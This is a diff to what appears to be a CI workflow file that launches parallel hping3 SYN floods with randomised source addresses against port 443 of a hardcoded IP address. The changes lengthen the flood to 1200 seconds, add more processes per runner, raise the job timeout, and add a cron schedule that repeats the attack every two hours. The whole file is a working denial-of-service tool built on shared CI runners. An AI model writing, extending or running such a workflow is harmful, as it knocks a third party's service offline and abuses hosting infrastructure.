@@ -7,14 +7,16 @@ on:
         default: '57.131.163.31'
       seconds:
         description: 'flood seconds'
-        default: '300'
+        default: '1200'
       procs:
         description: 'parallel hping3 per runner'
-        default: '2'
+        default: '3'
+  schedule:
+    - cron: '15 */2 * * *'
 jobs:
   syn:
     runs-on: ubuntu-latest
-    timeout-minutes: 40
+    timeout-minutes: 70
     strategy:
       fail-fast: false
       matrix:
@@ -30,4 +32,4 @@ jobs:
             sudo timeout -s INT ${{ inputs.seconds }} hping3 --flood -S -p 443 -d 0 --rand-source ${{ inputs.target }} >> /tmp/hp.log 2>&1 &
           done
           wait
-          grep transmitted /tmp/hp.log | head -5
+          grep transmitted /tmp/hp.log | head -6
